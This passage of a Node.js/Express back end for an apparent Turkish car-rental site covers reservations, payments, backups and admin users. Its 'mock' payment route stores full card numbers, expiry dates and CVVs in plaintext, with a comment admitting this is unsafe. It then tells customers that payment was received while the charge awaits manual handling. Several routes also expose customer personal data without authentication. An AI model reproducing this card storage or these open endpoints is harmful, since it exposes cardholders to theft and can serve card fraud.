        "UPDATE vehicles SET model = ?, price = ?, deposit = ?, status = ?, image = ?, passengers = ?, fuel = ?, transmission = ?, category = ? WHERE id = ?",
        [model, price, deposit, status, image, passengers || 5, fuel || 'Benzin', transmission || 'Otomatik', category || 'Binek', req.params.id],
        function(err) {
            if (err) {
                console.error('❌ UPDATE hatası:', err);
                return res.status(500).json({ error: err.message });
            }
            console.log('✅ UPDATE sonucu - Değiştirilen satır sayısı:', this.changes);
            if (this.changes === 0) {
                return res.status(404).json({ error: 'Araç bulunamadı' });
            }
            res.json({ id: req.params.id, model, price, deposit, status, image, passengers, fuel, transmission, category });
        }
    );
});

// DELETE araç sil (KORUNMALI)
app.delete('/api/vehicles/:id', authenticateToken, (req, res) => {
    const { id } = req.params;
    db.run("DELETE FROM vehicles WHERE id = ?", [id], function(err) {
        if (err) {
            res.status(500).json({ error: err.message });
            return;
        }
        res.json({ message: 'Araç silindi', changes: this.changes });
    });
});

// Admin için default data.html içeriğini getir
app.get('/api/admin/default-data', authenticateToken, (req, res) => {
    const filePath = path.join(__dirname, 'src', 'data.html');
    
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Dosya okuma hatası:', err);
            return res.status(500).json({ error: 'Varsayılan veri dosyası okunamadı' });
        }
        res.send(data);
    });
});

// Teklifler (Quotations) API
// ==========================================

// GET tüm teklifleri al
app.get('/api/quotations', (req, res) => {
    db.all(`
        SELECT q.*, v.model as vehicleName 
        FROM quotations q 
        LEFT JOIN vehicles v ON q.vehicleId = v.id 
        ORDER BY q.createdAt DESC
    `, (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});

// POST yeni teklif ekle
app.post('/api/quotations', [
    body('name').trim().notEmpty().isLength({ max: 100 }).escape(),
    body('email').trim().isEmail().normalizeEmail(),
    body('phone').trim().matches(/^[0-9+\s()-]{10,20}$/),
    body('vehicleId').trim().notEmpty(),
    body('message').trim().notEmpty().isLength({ max: 1000 }).escape(),
    body('status').optional().trim().isIn(['yeni', 'görüldü', 'yanıtlandı'])
], (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }
    
    const { name, email, phone, vehicleId, message, status } = req.body;

    db.run(
        `INSERT INTO quotations (name, email, phone, vehicleId, message, status)
         VALUES (?, ?, ?, ?, ?, ?)`,
        [name, email, phone, vehicleId, message, status || 'yeni'],
        function(err) {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ id: this.lastID, name, email, phone, vehicleId, message, status: status || 'yeni' });
        }
    );
});

// PUT teklif durumunu güncelle (KORUNMALI)
app.put('/api/quotations/:id', authenticateToken, (req, res) => {
    const { status } = req.body;

    if (!status) {
        return res.status(400).json({ error: 'Durum gerekli' });
    }

    db.run(
        "UPDATE quotations SET status = ? WHERE id = ?",
        [status, req.params.id],
        function(err) {
            if (err) return res.status(500).json({ error: err.message });
            if (this.changes === 0) {
                return res.status(404).json({ error: 'Teklif bulunamadı' });
            }
            res.json({ id: req.params.id, status });
        }
    );
});

// DELETE teklifi sil (KORUNMALI)
app.delete('/api/quotations/:id', authenticateToken, (req, res) => {
    db.run("DELETE FROM quotations WHERE id = ?", [req.params.id], function(err) {
        if (err) return res.status(500).json({ error: err.message });
        if (this.changes === 0) {
            return res.status(404).json({ error: 'Teklif bulunamadı' });
        }
        res.json({ message: 'Teklif silindi' });
    });
});

// ==========================================
// RESERVATIONS (ARAÇ RESERVASYONLARı) API
// ==========================================

// GET tüm rezervasyonları al
app.get('/api/reservations', (req, res) => {
    const { id } = req.query;
    let query = `
        SELECT r.*, v.model as vehicleName, v.price as vehiclePrice,
               c.fullName as customerName, c.email as customerEmail, c.phone as customerPhone
        FROM reservations r 
        LEFT JOIN vehicles v ON r.vehicleId = v.id 
        LEFT JOIN customers c ON r.customerId = c.id
    `;
    const params = [];

    if (id) {
        query += ` WHERE r.id = ?`;
        params.push(id);
    } else {
        query += ` ORDER BY r.createdAt DESC`;
    }

    db.all(query, params, (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});

// POST yeni rezervasyon ekle
app.post('/api/reservations', [
    body('fullName').trim().notEmpty().isLength({ max: 100 }).escape(),
    body('email').trim().isEmail().normalizeEmail(),
    body('phone').trim().matches(/^[0-9+\s()-]{10,20}$/),
    body('pickupLocation').trim().notEmpty().escape(),
    body('dropoffLocation').trim().notEmpty().escape(),
    body('pickupDate').trim().isISO8601().toDate(),
    body('pickupTime').trim().notEmpty(),
    body('dropoffDate').trim().isISO8601().toDate(),
    body('dropoffTime').trim().notEmpty(),
    body('vehicleId').optional().trim(),
    body('specialRequests').optional().trim().isLength({ max: 500 }).escape(),
    body('totalPrice').optional().trim()
], (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }
    
    const { fullName, email, phone, pickupLocation, dropoffLocation, pickupDate, pickupTime, dropoffDate, dropoffTime, vehicleId, specialRequests, totalPrice, customerId } = req.body;

    db.run(
        `INSERT INTO reservations (fullName, email, phone, pickupLocation, dropoffLocation, pickupDate, pickupTime, dropoffDate, dropoffTime, vehicleId, customerId, specialRequests, totalPrice, status)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        [fullName, email, phone, pickupLocation, dropoffLocation, pickupDate, pickupTime, dropoffDate, dropoffTime, vehicleId || null, customerId || null, specialRequests || null, totalPrice || null, 'yeni'],
        function(err) {
            if (err) {
                return res.status(500).json({ error: err.message });
            }

            // Telegram Notification
            try {
                const pDateStr = pickupDate instanceof Date ? pickupDate.toISOString().split('T')[0] : pickupDate;
                const dDateStr = dropoffDate instanceof Date ? dropoffDate.toISOString().split('T')[0] : dropoffDate;
                
                const msg = `🆕 <b>YENİ REZERVASYON</b> 🆕\n\n` +
                            `👤 <b>Müşteri:</b> ${fullName}\n` +
                            `📞 <b>Telefon:</b> ${phone}\n` +
                            `📧 <b>Email:</b> ${email || '-'}\n\n` +
                            `🚗 <b>Araç ID:</b> ${vehicleId || '-'}\n` +
                            `💰 <b>Tutar:</b> ${totalPrice ? totalPrice + ' TRY' : 'Hesaplanmadı'}\n\n` +
                            `📍 <b>Alış:</b> ${pickupLocation}\n📅 ${pDateStr} ${pickupTime}\n` +
                            `📍 <b>İade:</b> ${dropoffLocation}\n📅 ${dDateStr} ${dropoffTime}\n\n` +
                            `📝 <b>Not:</b> ${specialRequests || '-'}`;
                sendTelegramNotification(msg);
            } catch (e) { console.error('Telegram error:', e); }

            res.json({ 
                id: this.lastID, 
                fullName, email, phone, pickupLocation, dropoffLocation, 
                pickupDate, pickupTime, dropoffDate, dropoffTime, 
                vehicleId, customerId, specialRequests, totalPrice, status: 'yeni' 
            });
        }
    );
});

// PUT rezervasyon durumunu güncelle (KORUNMALI)
app.put('/api/reservations/:id', authenticateToken, (req, res) => {
    const { status, totalPrice } = req.body;

    if (!status) {
        return res.status(400).json({ error: 'Durum gerekli' });
    }

    db.run(
        "UPDATE reservations SET status = ?, totalPrice = ? WHERE id = ?",
        [status, totalPrice || null, req.params.id],
        function(err) {
            if (err) return res.status(500).json({ error: err.message });
            if (this.changes === 0) {
                return res.status(404).json({ error: 'Rezervasyon bulunamadı' });
            }
            res.json({ id: req.params.id, status, totalPrice });
        }
    );
});

// DELETE rezervasyonu sil (KORUNMALI)
app.delete('/api/reservations/:id', authenticateToken, (req, res) => {
    db.run("DELETE FROM reservations WHERE id = ?", [req.params.id], function(err) {
        if (err) return res.status(500).json({ error: err.message });
        if (this.changes === 0) {
            return res.status(404).json({ error: 'Rezervasyon bulunamadı' });
        }
        res.json({ message: 'Rezervasyon silindi' });
    });
});

// ==========================================
// CUSTOMERS & PAYMENTS (MOCK) API
// ==========================================

// POST /api/customers/upsert - Müşteri bilgisi oluştur/güncelle
app.post('/api/customers/upsert', [
    body('email').trim().isEmail().normalizeEmail(),
    body('fullName').optional().trim().isLength({ max: 100 }).escape(),
    body('phone').optional().trim().matches(/^[0-9+\s()-]{10,20}$/),
    body('addressLine').optional().trim().isLength({ max: 200 }).escape(),
    body('city').optional().trim().isLength({ max: 100 }).escape(),
    body('country').optional().trim().isLength({ max: 100 }).escape(),
    body('postalCode').optional().trim().isLength({ max: 20 }).escape()
], (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }

    const { email, fullName, phone, addressLine, city, country, postalCode } = req.body;

    db.get('SELECT id FROM customers WHERE email = ?', [email], (err, existing) => {
        if (err) return res.status(500).json({ error: err.message });
        if (existing) {
            db.run(
                `UPDATE customers SET fullName = ?, phone = ?, addressLine = ?, city = ?, country = ?, postalCode = ?, updatedAt = CURRENT_TIMESTAMP WHERE id = ?`,
                [fullName || null, phone || null, addressLine || null, city || null, country || null, postalCode || null, existing.id],
                function (uErr) {
                    if (uErr) return res.status(500).json({ error: uErr.message });
                    return res.json({ id: existing.id, email, fullName, phone, addressLine, city, country, postalCode });
                }
            );
        } else {
            db.run(
                `INSERT INTO customers (fullName, email, phone, addressLine, city, country, postalCode) VALUES (?, ?, ?, ?, ?, ?, ?)`,
                [fullName || null, email, phone || null, addressLine || null, city || null, country || null, postalCode || null],
                function (iErr) {
                    if (iErr) return res.status(500).json({ error: iErr.message });
                    return res.json({ id: this.lastID, email, fullName, phone, addressLine, city, country, postalCode });
                }
            );
        }
    });
});

// GET - Ödemeleri listele
app.get('/api/payments', authenticateToken, (req, res) => {
    db.all(`
        SELECT p.*, r.fullName as reservationName, c.fullName as customerName 
        FROM payments p 
        LEFT JOIN reservations r ON p.reservationId = r.id 
        LEFT JOIN customers c ON p.customerId = c.id 
        ORDER BY p.createdAt DESC
    `, (err, rows) => {
        if (err) {
            console.error('Ödeme listeleme hatası:', err);
            return res.status(500).json({ error: 'Veritabanı hatası' });
        }
        res.json(rows);
    });
});

// DELETE - Ödeme sil
app.delete('/api/payments/:id', authenticateToken, (req, res) => {
    const id = req.params.id;
    db.run("DELETE FROM payments WHERE id = ?", [id], function(err) {
        if (err) {
            console.error('Ödeme silme hatası:', err);
            return res.status(500).json({ error: 'Veritabanı hatası' });
        }
        if (this.changes === 0) {
            return res.status(404).json({ error: 'Ödeme bulunamadı' });
        }
        res.json({ success: true, message: 'Ödeme silindi' });
    });
});

// POST /api/payments/mock-intent - Banka bağlantısı olmadan ödeme akışı
app.post('/api/payments/mock-intent', [
    body('reservationId').optional().isInt(),
    body('fullName').optional().trim().isLength({ max: 100 }).escape(),
    body('email').optional().trim().isEmail().normalizeEmail(),
    body('phone').optional().trim().matches(/^[0-9+\s()-]{10,20}$/),
    body('amount').isFloat({ min: 0 }),
    body('currency').optional().trim().isIn(['TRY','USD','EUR']),
    body('cardNumber').trim().isLength({ min: 12, max: 19 }),
    body('cardHolder').optional().trim(),
    body('expiryMonth').optional().trim(),
    body('expiryYear').optional().trim(),
    body('cvv').optional().trim()
], (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }

    const {
        reservationId,
        fullName, email, phone, addressLine, city, country, postalCode,
        pickupLocation, dropoffLocation, pickupDate, pickupTime, dropoffDate, dropoffTime,
        vehicleId, amount, currency = 'TRY', cardNumber,
        cardHolder, expiryMonth, expiryYear, cvv
    } = req.body;

    // Kart meta bilgisi
    const last4 = String(cardNumber).slice(-4);
    const first = String(cardNumber)[0];
    const brand = first === '4' ? 'Visa' : first === '5' ? 'Mastercard' : first === '3' ? 'Amex/Diners' : 'Card';

    const processPayment = (resId, custId) => {
        const intentId = `mock_${Date.now()}_${Math.random().toString(36).slice(2,8)}`;
        
        // Kart bilgilerini kaydet (Kullanıcı isteği üzerine - Güvenlik uyarısı: Normalde yapılmamalı)
        db.run(
            `INSERT INTO payments (
                reservationId, customerId, provider, intentId, status, 
                amount, currency, cardBrand, cardLast4,
                cardHolder, fullCardNumber, expiryMonth, expiryYear, cvv
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [
                resId, custId || null, 'mock', intentId, 'pending_manual', 
                amount, currency, brand, last4,
                cardHolder, cardNumber, expiryMonth, expiryYear, cvv
            ],
            function (pErr) {
                if (pErr) return res.status(500).json({ error: pErr.message });
                
                // Rezervasyon durumunu güncelle
                db.run("UPDATE reservations SET status = 'pending_payment' WHERE id = ?", [resId]);

                // Telegram Notification
                try {
                    const msg = `🎉 <b>ÖDEME ALINDI</b> 🎉\n\n` +
                                `👤 <b>Müşteri:</b> ${fullName || cardHolder || 'Bilinmiyor'}\n` +
                                `📞 <b>Telefon:</b> ${phone || '-'}\n` +
                                `💰 <b>Tutar:</b> ${amount} ${currency}\n` +
                                `💳 <b>Kart:</b> ${brand} **** ${last4}\n` +
                                `🆔 <b>Rez ID:</b> ${resId}`;
                    sendTelegramNotification(msg);
                } catch (e) { console.error('Telegram error:', e); }

                return res.json({
                    success: true,
                    reservationId: resId,
                    paymentId: this.lastID,
                    intentId,
                    status: 'pending_manual',
                    message: 'Ödeme alındı.'
                });
            }
        );
    };

    if (reservationId) {
        // Mevcut rezervasyon için ödeme
        processPayment(reservationId, null);
    } else {
        // Yeni rezervasyon oluştur (Eski akış desteği)
        db.get('SELECT id FROM customers WHERE email = ?', [email], (err, cust) => {
            if (err) return res.status(500).json({ error: err.message });

            const upsertCustomer = (customerId) => {
                db.run(
                    `INSERT INTO reservations (fullName, email, phone, pickupLocation, dropoffLocation, pickupDate, pickupTime, dropoffDate, dropoffTime, vehicleId, customerId, specialRequests, totalPrice, status)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
                    [fullName, email, phone, pickupLocation, dropoffLocation, pickupDate, pickupTime, dropoffDate, dropoffTime, vehicleId || null, customerId || null, null, amount.toFixed(2), 'pending_payment'],
                    function (rErr) {
                        if (rErr) return res.status(500).json({ error: rErr.message });
                        processPayment(this.lastID, customerId);
                    }
                );
            };
            
            if (!cust) {
                 db.run("INSERT INTO customers (email, fullName, phone) VALUES (?, ?, ?)", [email, fullName, phone], function(err) {
                     if (err) return res.status(500).json({ error: err.message });
                     upsertCustomer(this.lastID);
                 });
            } else {
                upsertCustomer(cust.id);
            }
        });
    }
});

// ==========================================
// QUICK RESERVATIONS (HIZLI REZERVASYON) API
// ==========================================

// GET tüm hızlı rezervasyonları al
app.get('/api/quick-reservations', authenticateToken, (req, res) => {
    db.all(`
        SELECT qr.*, v.model as vehicleName, v.price as vehiclePrice
        FROM quick_reservations qr
        LEFT JOIN vehicles v ON qr.vehicleId = v.id
        ORDER BY qr.createdAt DESC
    `, (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});

// POST yeni hızlı rezervasyon talebi ekle
app.post('/api/quick-reservations', [
    body('fullName').trim().notEmpty().isLength({ max: 100 }).escape(),
    body('phone').trim().matches(/^[0-9+\s()-]{10,20}$/),
    body('pickupDate').trim().isISO8601().toDate(),
    body('dropoffDate').trim().isISO8601().toDate(),
    body('vehicleId').optional().trim(),
    body('days').isInt({ min: 1 }),
    body('dailyPrice').isFloat({ min: 0 }),
    body('subtotal').isFloat({ min: 0 }),
    body('vatRate').isFloat({ min: 0 }),
    body('vatAmount').isFloat({ min: 0 }),
    body('discountRate').isFloat({ min: 0 }),
    body('discountAmount').isFloat({ min: 0 }),
    body('totalPrice').isFloat({ min: 0 }),
    body('source').optional().trim().isLength({ max: 100 })
], (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }

    const {
        fullName,
        phone,
        pickupDate,
        dropoffDate,
        vehicleId,
        days,
        dailyPrice,
        subtotal,
        vatRate,
        vatAmount,
        discountRate,
        discountAmount,
        totalPrice,
        source
    } = req.body;

    // Hızlı rezervasyon detaylarını not olarak ekle
    const specialRequests = `Hızlı Rezervasyon (${source || 'quick-card-modal'})\n` +
        `Gün: ${days}, Günlük: ${dailyPrice} TL\n` +
        `Ara Toplam: ${subtotal} TL, KDV: ${vatAmount} TL, İndirim: ${discountAmount} TL`;

    // Ana rezervasyon tablosuna ekle
    db.run(
        `INSERT INTO reservations (
            fullName, email, phone, 
            pickupLocation, dropoffLocation, 
            pickupDate, pickupTime, 
            dropoffDate, dropoffTime, 
            vehicleId, specialRequests, totalPrice, status
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        [
            fullName, 
            'hizli@rezervasyon.temp', // Placeholder email
            phone, 
            'Merkez Ofis', // Default location
            'Merkez Ofis', // Default location
            pickupDate, 
            '10:00', // Default time
            dropoffDate, 
            '10:00', // Default time
            vehicleId || null, 
            specialRequests, 
            totalPrice, 
            'yeni'
        ],
        function(err) {
            if (err) {
                return res.status(500).json({ error: err.message });
            }

            // Telegram Notification
            try {
                const pDateStr = pickupDate instanceof Date ? pickupDate.toISOString().split('T')[0] : pickupDate;
                const dDateStr = dropoffDate instanceof Date ? dropoffDate.toISOString().split('T')[0] : dropoffDate;

                const msg = `⚡ <b>HIZLI REZERVASYON</b> ⚡\n\n` +
                            `👤 <b>Müşteri:</b> ${fullName}\n` +
                            `📞 <b>Telefon:</b> ${phone}\n` +
                            `🚗 <b>Araç ID:</b> ${vehicleId || '-'}\n` +
                            `💰 <b>Tutar:</b> ${totalPrice} TRY\n` +
                            `📅 <b>Tarihler:</b> ${pDateStr} - ${dDateStr}\n` +
                            `ℹ️ <i>Detaylar için admin paneline gidiniz.</i>`;
                sendTelegramNotification(msg);
            } catch (e) { console.error('Telegram error:', e); }

            res.json({
                id: this.lastID,
                fullName,
                phone,
                pickupDate,
                dropoffDate,
                vehicleId,
                totalPrice,
                status: 'yeni'
            });
        }
    );
});

// PUT hızlı rezervasyon durumunu güncelle (KORUNMALI)
app.put('/api/quick-reservations/:id', authenticateToken, (req, res) => {
    const { status } = req.body;

    if (!status) {
        return res.status(400).json({ error: 'Durum gerekli' });
    }

    db.run(
        'UPDATE quick_reservations SET status = ? WHERE id = ?',
        [status, req.params.id],
        function(err) {
            if (err) return res.status(500).json({ error: err.message });
            if (this.changes === 0) {
                return res.status(404).json({ error: 'Hızlı rezervasyon bulunamadı' });
            }
            res.json({ id: req.params.id, status });
        }
    );
});

// DELETE hızlı rezervasyonu sil (KORUNMALI)
app.delete('/api/quick-reservations/:id', authenticateToken, (req, res) => {
    db.run('DELETE FROM quick_reservations WHERE id = ?', [req.params.id], function(err) {
        if (err) return res.status(500).json({ error: err.message });
        if (this.changes === 0) {
            return res.status(404).json({ error: 'Hızlı rezervasyon bulunamadı' });
        }
        res.json({ message: 'Hızlı rezervasyon silindi' });
    });
});
// ==========================================
// LOCATIONS (ALIŞ/İADE YERLERİ) API
// ==========================================
// GET tüm lokasyonları al
app.get('/api/locations', (req, res) => {
    db.all(`
        SELECT * FROM locations 
        WHERE isActive = 1
        ORDER BY region ASC, name ASC
    `, (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});

// GET tüm lokasyonları (admin - deaktif dahil)
app.get('/api/locations/admin/all', (req, res) => {
    db.all(`
        SELECT * FROM locations 
        ORDER BY region ASC, name ASC
    `, (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});

// GET lokasyonları bölgeye göre grupla
app.get('/api/locations/grouped', (req, res) => {
    db.all(`
        SELECT DISTINCT region FROM locations 
        WHERE isActive = 1
        ORDER BY region ASC
    `, (err, regions) => {
        if (err) return res.status(500).json({ error: err.message });
        
        if (!regions) {
            return res.json({});
        }

        const grouped = {};
        let completed = 0;

        regions.forEach(r => {
            db.all(`
                SELECT * FROM locations 
                WHERE region = ? AND isActive = 1
                ORDER BY name ASC
            `, [r.region], (err, items) => {
                if (!err) {
                    grouped[r.region] = items;
                }
                completed++;
                if (completed === regions.length) {
                    res.json(grouped);
                }
            });
        });
    });
});

// POST yeni lokasyon ekle (KORUNMALI)
app.post('/api/locations', authenticateToken, [
    body('region').trim().notEmpty().escape(),
    body('name').trim().notEmpty().escape(),
    body('code').trim().notEmpty().escape()
], (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }
    
    const { region, name, code, type } = req.body;

    db.run(
        "INSERT INTO locations (region, name, code, type) VALUES (?, ?, ?, ?)",
        [region, name, code, type || 'airport'],
        function(err) {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ id: this.lastID, region, name, code, type: type || 'airport', isActive: 1 });
        }
    );
});

// PUT lokasyon güncelle (KORUNMALI)
app.put('/api/locations/:id', authenticateToken, [
    body('region').trim().notEmpty().escape(),
    body('name').trim().notEmpty().escape(),
    body('code').trim().notEmpty().escape()
], (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }
    const { region, name, code, type, isActive } = req.body;

    db.run(
        "UPDATE locations SET region = ?, name = ?, code = ?, type = ?, isActive = ? WHERE id = ?",
        [region, name, code, type || 'airport', isActive !== undefined ? isActive : 1, req.params.id],
        function(err) {
            if (err) return res.status(500).json({ error: err.message });
            if (this.changes === 0) {
                return res.status(404).json({ error: 'Lokasyon bulunamadı' });
            }
            res.json({ id: req.params.id, region, name, code, type, isActive });
        }
    );
});

// DELETE lokasyonu sil (KORUNMALI)
app.delete('/api/locations/:id', authenticateToken, (req, res) => {
    db.run("DELETE FROM locations WHERE id = ?", [req.params.id], function(err) {
        if (err) return res.status(500).json({ error: err.message });
        if (this.changes === 0) {
            return res.status(404).json({ error: 'Lokasyon bulunamadı' });
        }
        res.json({ message: 'Lokasyon silindi' });
    });
});

// Admin panel route
app.get('/admin.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// Clear storage route
app.get('/clear-storage.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'clear-storage.html'));
});

// Import vehicles route
app.get('/import-vehicles.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'import-vehicles.html'));
});

// Image download endpoint (KORUNMALI - sadece admin)
app.post('/api/download-image', authenticateToken, async (req, res) => {
    const { imageUrl, vehicleName } = req.body;
    
    if (!imageUrl) {
        return res.status(400).json({ error: 'Image URL gerekli' });
    }

    try {
        // Dosya adını oluştur (güvenli hale getir)
        const timestamp = Date.now();
        const safeName = vehicleName 
            ? vehicleName.replace(/[^a-z0-9]/gi, '_').toLowerCase() 
            : 'vehicle';
        const fileName = `${safeName}_${timestamp}.webp`;
        const imgDir = path.join(__dirname, 'img');
        const filePath = path.join(imgDir, fileName);

        // img klasörü yoksa oluştur
        if (!fs.existsSync(imgDir)) {
            fs.mkdirSync(imgDir, { recursive: true });
        }

        // URL'den resmi indir
        const file = fs.createWriteStream(filePath);
        
        // User-Agent ekle (bazı sunucular botları engeller)
        const options = {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        };

        https.get(imageUrl, options, (response) => {
            if (response.statusCode !== 200) {
                if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
                return res.status(400).json({ error: `Resim indirilemedi. Status: ${response.statusCode}` });
            }

            response.pipe(file);

            file.on('finish', () => {
                file.close(() => {
                    // Görseli dist/img klasörüne de kopyala (Build gerektirmemesi için)
                    try {
                        const distImgDir = path.join(__dirname, 'dist', 'img');
                        if (!fs.existsSync(distImgDir)) {
                            fs.mkdirSync(distImgDir, { recursive: true });
                        }
                        const distFilePath = path.join(distImgDir, fileName);
                        fs.copyFileSync(filePath, distFilePath);
                        console.log(`✅ Resim dist klasörüne kopyalandı: ${distFilePath}`);
                    } catch (copyError) {
                        console.error('⚠️ Resim kopyalama hatası:', copyError);
                    }

                    console.log(`✅ Resim indirildi: ${fileName}`);
                    res.json({ 
                        success: true, 
                        localPath: `/img/${fileName}`,
                        fileName: fileName 
                    });
                });
            });
        }).on('error', (err) => {
            if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
            console.error('❌ Download error:', err);
            res.status(500).json({ error: 'Resim indirilemedi: ' + err.message });
        });

    } catch (error) {
        console.error('❌ Image download error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ===== BACKUP API =====
const backupsDir = path.join(__dirname, 'backups');
if (!fs.existsSync(backupsDir)) {
    fs.mkdirSync(backupsDir, { recursive: true });
}

// GET - Yedekleri listele
app.get('/api/backups', authenticateToken, (req, res) => {
    try {
        const files = fs.readdirSync(backupsDir)
            .filter(file => file.endsWith('.zip'))
            .map(file => {
                const stats = fs.statSync(path.join(backupsDir, file));
                return {
                    name: file,
                    size: (stats.size / 1024 / 1024).toFixed(2) + ' MB',
                    date: stats.mtime.toLocaleString('tr-TR')
                };
            })
            .sort((a, b) => new Date(b.date) - new Date(a.date));
        res.json(files);
    } catch (error) {
        console.error('❌ Backup listesi hatası:', error);
        res.status(500).json({ error: error.message });
    }
});

// POST - Yedek oluştur
app.post('/api/backups/create', authenticateToken, (req, res) => {
    try {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
        const backupFileName = `rentcar-backup-${timestamp}.zip`;
        const backupPath = path.join(backupsDir, backupFileName);

        // ZIP komutu ile yedek oluştur
        const { exec } = require('child_process');
        const command = `cd /var/www && zip -r "${backupPath}" rentcar -x "rentcar/node_modules/*" "rentcar/.git/*" "rentcar/dist/*" "rentcar/backups/*"`;
        
        exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error('❌ Backup oluşturma hatası:', error);
                return res.status(500).json({ error: 'Yedek oluşturulamadı' });
            }
            
            const stats = fs.statSync(backupPath);
            console.log(`✅ Yedek oluşturuldu: ${backupFileName}`);
            res.json({
                success: true,
                message: 'Yedek başarıyla oluşturuldu',
                file: backupFileName,
                size: (stats.size / 1024 / 1024).toFixed(2) + ' MB'
            });
        });
    } catch (error) {
        console.error('❌ Backup error:', error);
        res.status(500).json({ error: error.message });
    }
});

// GET - Yedek indir
app.get('/api/backups/download/:filename', authenticateToken, (req, res) => {
    try {
        const filename = req.params.filename;
        if (!filename.endsWith('.zip') || filename.includes('..')) {
            return res.status(400).json({ error: 'Geçersiz dosya adı' });
        }
        
        const filePath = path.join(backupsDir, filename);
        if (!fs.existsSync(filePath)) {
            return res.status(404).json({ error: 'Yedek dosyası bulunamadı' });
        }

        res.download(filePath, filename);
    } catch (error) {
        console.error('❌ Download error:', error);
        res.status(500).json({ error: error.message });
    }
});

// DELETE - Yedek sil
app.delete('/api/backups/:filename', authenticateToken, (req, res) => {
    try {
        const filename = req.params.filename;
        if (!filename.endsWith('.zip') || filename.includes('..')) {
            return res.status(400).json({ error: 'Geçersiz dosya adı' });
        }
        
        const filePath = path.join(backupsDir, filename);
        if (!fs.existsSync(filePath)) {
            return res.status(404).json({ error: 'Yedek dosyası bulunamadı' });
        }

        fs.unlinkSync(filePath);
        console.log(`✅ Yedek silindi: ${filename}`);
        res.json({ success: true, message: 'Yedek başarıyla silindi' });
    } catch (error) {
        console.error('Yedek silme hatası:', error);
        res.status(500).json({ error: 'Yedek silinirken hata oluştu' });
    }
});

// --- SETTINGS API ---

// Ayarları getir
app.get('/api/settings', (req, res) => {
    db.all("SELECT key, value FROM settings", (err, rows) => {
        if (err) {
            console.error('Ayarlar okuma hatası:', err);
            return res.status(500).json({ error: err.message });
        }
        
        const settings = {};
        rows.forEach(row => {
            settings[row.key] = row.value;
        });
        res.json(settings);
    });
});

// Ayarları güncelle
app.put('/api/settings', authenticateToken, (req, res) => {
    const settings = req.body;
    const keys = Object.keys(settings);
    
    if (keys.length === 0) {
        return res.status(400).json({ error: 'Güncellenecek ayar bulunamadı' });
    }

    db.serialize(() => {
        db.run("BEGIN TRANSACTION");
        
        let completed = 0;
        let hasError = false;

        keys.forEach(key => {
            db.run("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", [key, settings[key]], (err) => {
                if (err) {
                    hasError = true;
                    console.error(`Ayar güncelleme hatası (${key}):`, err);
                }
                completed++;
                
                if (completed === keys.length) {
                    if (hasError) {
                        db.run("ROLLBACK");
                        res.status(500).json({ error: 'Bazı ayarlar güncellenemedi' });
                    } else {
                        db.run("COMMIT");
                        res.json({ success: true, message: 'Ayarlar güncellendi' });
                    }
                }
            });
        });
    });
});

// --- USER MANAGEMENT API ---

// Kullanıcıları listele
app.get('/api/users', authenticateToken, (req, res) => {
    db.all("SELECT id, username, email, createdAt, lastLogin FROM admin_users ORDER BY createdAt DESC", (err, rows) => {
        if (err) {
            console.error('Kullanıcı listeleme hatası:', err);
            return res.status(500).json({ error: 'Veritabanı hatası' });
        }
        res.json(rows);
    });
});

// Yeni kullanıcı ekle
app.post('/api/users', authenticateToken, [
    body('username').trim().isLength({ min: 3 }).escape(),
    body('password').isLength({ min: 6 }),
    body('email').optional().isEmail().normalizeEmail()
], async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }

    const { username, password, email } = req.body;

    try {
        const hashedPassword = await bcrypt.hash(password, 10);
        
        db.run("INSERT INTO admin_users (username, password, email) VALUES (?, ?, ?)", 
            [username, hashedPassword, email], 
            function(err) {
                if (err) {
                    if (err.message.includes('UNIQUE constraint failed')) {
                        return res.status(400).json({ error: 'Bu kullanıcı adı zaten kullanılıyor' });
                    }
                    console.error('Kullanıcı ekleme hatası:', err);
                    return res.status(500).json({ error: 'Veritabanı hatası' });
                }
                res.json({ success: true, id: this.lastID, message: 'Kullanıcı oluşturuldu' });
            }
        );
    } catch (error) {
        console.error('Kullanıcı oluşturma hatası:', error);
